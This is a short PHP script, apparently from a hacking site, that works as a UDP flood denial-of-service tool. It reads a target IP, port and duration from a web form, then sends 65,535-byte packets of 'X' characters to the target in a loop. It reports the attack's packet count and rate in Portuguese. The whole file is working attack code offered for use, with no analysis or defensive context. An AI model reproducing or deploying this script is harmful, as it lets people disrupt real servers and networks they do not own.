<?php

//=================================================
//Ardamax Sola Muiiiito
//www.ZeroDayExile.com
//=================================================

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
print "Ataque: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Ataque Completo".time('h:i:s')." com $packets (" . round(($packets*65)/1024, 2) . " mB) pacotes em média ". round($packets/$exec_time, 2) . " packets por/segundo \n";
?>

